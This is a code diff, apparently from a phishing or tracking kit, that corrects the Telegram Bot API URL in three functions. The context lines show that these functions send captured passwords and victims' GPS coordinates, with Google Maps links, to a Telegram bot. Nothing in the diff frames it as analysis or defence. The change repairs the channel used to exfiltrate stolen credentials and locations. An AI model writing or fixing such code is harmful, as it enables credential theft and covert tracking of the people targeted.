@@ -56,7 +56,7 @@
                  `🔑 *Contraseña:* \`${credentials.password}\`\n\n` +
                  `_Credenciales capturadas correctamente._`;
 
-    const url = `https://telegram.org{TELEGRAM_TOKEN}/sendMessage`;
+    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
 
     return fetch(url, {
       method: 'POST',
@@ -147,7 +147,7 @@
                           `• Longitud: ${data.longitude}\n\n` +
                           `Google Maps: https://google.com{data.latitude},${data.longitude}`;
 
-        const url = `https://telegram.org{TELEGRAM_TOKEN}/sendMessage`;
+        const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
         
         fetch(url, {
             method: 'POST',
@@ -174,7 +174,7 @@
                     "• Precisión: ~" + Math.round(precision) + " metros\n\n" +
                     "Google Maps: " + baseMaps + latitud + "," + longitud;
 
-    const url = `https://telegram.org{TELEGRAM_TOKEN}/sendMessage`;
+    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
 
     fetch(url, {
         method: 'POST',
